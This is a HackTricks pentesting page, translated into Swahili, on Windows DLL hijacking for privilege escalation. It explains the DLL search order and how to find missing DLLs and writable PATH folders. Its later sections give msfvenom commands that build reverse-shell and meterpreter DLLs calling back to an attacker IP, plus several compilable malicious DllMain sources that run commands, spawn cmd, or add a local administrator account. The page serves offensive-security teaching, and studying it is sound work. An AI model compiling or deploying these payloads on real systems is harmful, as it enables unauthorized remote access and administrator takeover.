# Dll Hijacking

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Siri ya tuzo ya mdudu**: **jiandikishe** kwa **Intigriti**, jukwaa la tuzo la mdudu la **premium lililoundwa na wadukuzi, kwa wadukuzi**! Jiunge nasi kwenye [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) leo, na anza kupata tuzo hadi **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Taarifa Msingi

DLL Hijacking inahusisha kubadilisha programu iliyothibitishwa ili iweze kupakia DLL mbaya. Kauli hii inajumuisha mikakati kadhaa kama **DLL Spoofing, Injection, na Side-Loading**. Mara nyingi hutumiwa kwa utekelezaji wa nambari, kufikia uthabiti, na, mara chache, kupandisha mamlaka. Licha ya kuzingatia kupandisha hapa, njia ya utekaji inabaki sawa kwa malengo yote.

### Mbinu za Kawaida

Kuna njia kadhaa zinazotumiwa kwa DLL hijacking, kila moja ikiwa na ufanisi wake kulingana na mkakati wa upakiaji wa DLL wa programu:

1. **Kubadilisha DLL**: Kubadilisha DLL halisi na ile mbaya, ikitegemea matumizi ya DLL Proxying kuhifadhi utendaji wa DLL halisi.
2. **DLL Search Order Hijacking**: Kuweka DLL mbaya kwenye njia ya utafutaji mbele ya ile halali, kutumia mfumo wa utaftaji wa programu.
3. **Phantom DLL Hijacking**: Kuunda DLL mbaya kwa programu kupakia, ikidhani ni DLL inayohitajika ambayo haipo.
4. **DLL Redirection**: Kubadilisha vigezo vya utaftaji kama `%PATH%` au faili za `.exe.manifest` / `.exe.local` kuongoza programu kwenye DLL mbaya.
5. **WinSxS DLL Replacement**: Kubadilisha DLL halali na ile mbaya katika saraka ya WinSxS, njia mara nyingi inayohusishwa na DLL side-loading.
6. **Relative Path DLL Hijacking**: Kuweka DLL mbaya katika saraka inayoweza kudhibitiwa na mtumiaji pamoja na programu iliyohamishwa, ikifanana na mbinu za Binary Proxy Execution.

## Kupata Dlls Zilizopotea

Njia ya kawaida zaidi ya kupata Dlls zilizopotea ndani ya mfumo ni kwa kuzindua [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, **kuweka** **filta 2 zifuatazo**:

![](<../../../.gitbook/assets/image (958).png>)

![](<../../../.gitbook/assets/image (227).png>)

na kuonyesha tu **Shughuli za Mfumo wa Faili**:

![](<../../../.gitbook/assets/image (150).png>)

Ikiwa unatafuta **dlls zilizopotea kwa ujumla** unaweza **kuacha** hii ikifanya kazi kwa muda fulani.\
Ikiwa unatafuta **dll iliyopotea ndani ya programu maalum** unapaswa kuweka **filta nyingine kama "Jina la Mchakato" "lina" "\<jina la exe>", kuitekeleza, na kusitisha kuchukua matukio**.

## Kutumia Dlls Zilizopotea

Ili kupandisha mamlaka, nafasi bora tunayo ni kuweza **kuandika dll ambayo mchakato wa mamlaka atajaribu kupakia** mahali ambapo itatafutwa. Kwa hivyo, tutaweza **kuandika** dll katika **folda** ambapo **dll inatafutwa kabla** ya folda ambapo **dll halisi** iko (kisa cha kushangaza), au tutaweza **kuandika kwenye folda fulani ambapo dll itatafutwa** na **dll halisi haipo** kwenye folda yoyote.

### Mpangilio wa Utafutaji wa Dll

**Ndani ya** [**nyaraka za Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **unaweza kupata jinsi Dlls zinavyopakiwa kwa usahihi.**

**Programu za Windows** hutafuta DLL kwa kufuata seti ya **njia za utaftaji zilizopangwa mapema**, kufuata mfuatano maalum. Tatizo la DLL hijacking linatokea wakati DLL mbaya inawekwa kimkakati katika moja ya saraka hizi, ikahakikisha inapakiwa kabla ya DLL halisi. Suluhisho la kuzuia hii ni kuhakikisha programu inatumia njia za moja kwa moja wakati inahusu DLLs inayohitaji.

Unaweza kuona **mpangilio wa utaftaji wa DLL kwenye mifumo ya 32-bit** hapa chini:

1. Saraka ambayo programu imepakia.
2. Saraka ya mfumo. Tumia [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) kufikia njia ya saraka hii.(_C:\Windows\System32_)
3. Saraka ya mfumo ya 16-bit. Hakuna kazi inayopata njia ya saraka hii, lakini inatafutwa. (_C:\Windows\System_)
4. Saraka ya Windows. Tumia [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) kufikia njia ya saraka hii.
1. (_C:\Windows_)
5. Saraka ya sasa.
6. Saraka zilizoorodheshwa kwenye mazingira ya PATH. Tafadhali kumbuka hii haifahamishi njia ya kipekee ya programu iliyowekwa kwa kutumia ufunguo wa usajili wa **App Paths**. Ufunguo wa **App Paths** haufai wakati wa kuhesabu njia ya utaftaji wa DLL.

Hiyo ndiyo **mpangilio wa utaftaji wa msingi** na **SafeDllSearchMode** imewezeshwa. Wakati inapodisabled, saraka ya sasa inapanda hadi nafasi ya pili. Ili kulemaza kipengele hiki, unda thamani ya usajili ya **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** na iweke kama 0 (chaguo-msingi ni kuwezeshwa).

Ikiwa [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) inaitwa na **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** utaftaji huanza kwenye saraka ya moduli ya executable ambayo **LoadLibraryEx** inapakia.

Hatimaye, kumbuka kwamba **dll inaweza kupakiwa ikionyesha njia ya moja kwa moja badala ya jina tu**. Katika kesi hiyo dll hiyo **itaendelea kutafutwa kwenye njia hiyo** (ikiwa dll ina mahitaji yoyote, itatafutwa kama ilivyopakiwa kwa jina tu).

Kuna njia nyingine za kubadilisha njia za kubadilisha mpangilio wa utaftaji lakini sitaelezea hapa.
#### Mifano ya utaratibu wa kutafuta dll kutoka kwa nyaraka za Windows

Mifano fulani ya utaratibu wa kawaida wa kutafuta DLL inazingatiwa katika nyaraka za Windows:

- Wakati **DLL ambayo inashiriki jina na ile tayari imepakuliwa kumbukumbuni** inakutwa, mfumo hupuuza utaratibu wa kawaida wa utafutaji. Badala yake, hufanya ukaguzi wa upimaji na hati kabla ya kurudi kwa DLL iliyopo tayari kumbukumbuni. **Katika hali hii, mfumo haufanyi utafutaji wa DLL**.
- Katika hali ambapo DLL inatambuliwa kama **DLL inayojulikana** kwa toleo la sasa la Windows, mfumo utatumia toleo lake la DLL inayojulikana, pamoja na DLL zake zinazotegemea, **kupuuza mchakato wa utafutaji**. Funguo ya usajili **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** inashikilia orodha ya DLL hizi zinazojulikana.
- Ikiwa **DLL ina tegemezi**, utafutaji wa DLL hizi tegemezi hufanywa kana kwamba zimetajwa tu kwa kutumia **majina ya moduli** yao, bila kujali ikiwa DLL ya awali iligunduliwa kupitia njia kamili.

### Kuongeza Mamlaka

**Mahitaji**:

- Tambua mchakato ambao unafanya kazi au utafanya kazi chini ya **mamlaka tofauti** (mwenendo wa kando), ambao **haujajaza DLL**.
- Hakikisha kuwa kuna **upatikanaji wa kuandika** kwa **folda yoyote** ambapo **DLL** itatafutwa. Eneo hili linaweza kuwa folda ya kutekelezeka au folda ndani ya njia ya mfumo.

Ndio, mahitaji ni magumu kupata kwani **kwa chaguo-msingi ni aina ya ajabu kupata kutekelezeka yenye mamlaka ikikosa dll** na ni **zaidi ya ajabu kuwa na ruhusa ya kuandika kwenye folda ya njia ya mfumo** (kwa chaguo-msingi huwezi). Lakini, katika mazingira yaliyopangwa vibaya hili linawezekana.\
Katika hali unapokuwa na bahati na unakutana na mahitaji, unaweza kuangalia mradi wa [UACME](https://github.com/hfiref0x/UACME). Hata kama **lengo kuu la mradi ni kudanganya UAC**, unaweza kupata huko **Uthibitisho wa Mfano** wa Dll hijaking kwa toleo la Windows unaloweza kutumia (labda kwa kubadilisha njia ya folda ambapo una ruhusa ya kuandika).

Tafadhali kumbuka unaweza **kuangalia ruhusa zako katika folda** kwa kufanya:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Na **angalia ruhusa za folda zote ndani ya NJIA**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Unaweza pia kuangalia uingizaji wa faili inayoweza kutekelezwa na mauzo ya dll kwa:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Kwa mwongozo kamili juu ya jinsi ya **kutumia Dll Hijacking kwa kukuza mamlaka** na ruhusa ya kuandika kwenye folda ya **Njia ya Mfumo**, angalia:

{% content-ref url="writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Zana za Kiotomatiki

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) itachunguza ikiwa una ruhusa ya kuandika kwenye folda yoyote ndani ya NJIA ya Mfumo.\
Zana zingine za kiotomatiki za kuvumbua udhaifu huu ni **kazi za PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ na _Write-HijackDll._

### Mfano

Ikiwa utapata hali inayoweza kudukuliwa, moja ya mambo muhimu sana ya kufanikiwa kudukua itakuwa **kuunda dll ambayo ina vigezo vyote angalau vya kazi ambazo programu tumizi itaagiza kutoka kwake**. Hata hivyo, kumbuka kuwa Dll Hijacking inaweza kusaidia katika [kupanda kutoka kiwango cha Uadilifu wa Kati hadi cha Juu **(kipuuzi cha UAC)**](../../authentication-credentials-uac-and-efs/#uac) au kutoka [**Kiwango cha Juu hadi SYSTEM**](../#from-high-integrity-to-system)**.** Unaweza kupata mfano wa **jinsi ya kuunda dll halali** ndani ya utafiti huu wa kudukua dll uliolenga kudukua dll kwa utekelezaji: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Zaidi, katika **sehemu inayofuata** unaweza kupata **mifano ya msingi ya dll** ambayo inaweza kuwa na manufaa kama **mifano** au kuunda **dll yenye kazi zisizohitajika zilizoagizwa**.

## **Kuunda na Kukusanya Dlls**

### **Dll Proxifying**

Kimsingi, **Dll proxy** ni Dll inayoweza **kutekeleza kanuni yako ya malicious wakati inapakia** lakini pia **kufunua** na **kufanya kazi** kama **inavyotarajiwa** kwa **kupeleka simu zote kwa maktaba halisi**.

Kwa zana [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus) unaweza **kuonyesha programu tumizi na kuchagua maktaba** unayotaka kuweka kama proxy na **kuzalisha dll iliyoproxify** au **kuonyesha Dll** na **kuzalisha dll iliyoproxify**.

### **Meterpreter**

**Pata rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Pata meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Unda mtumiaji (x86 sikuona toleo la x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Yako mwenyewe

Tafadhali kumbuka kwamba katika visa kadhaa Dll unayounda lazima **izalishe kazi kadhaa** ambazo zitapakuliwa na mchakato wa mwathiriwa, ikiwa kazi hizi hazipo **binary haitaweza kuzipakia** na **kudanganya itashindwa**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Marejeo

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Mwongozo wa tuzo ya mdudu**: **jiandikishe** kwa **Intigriti**, jukwaa la tuzo la mdudu la malipo lililoundwa na wadukuzi, kwa wadukuzi! Jiunge nasi kwenye [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) leo, na anza kupata tuzo hadi **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
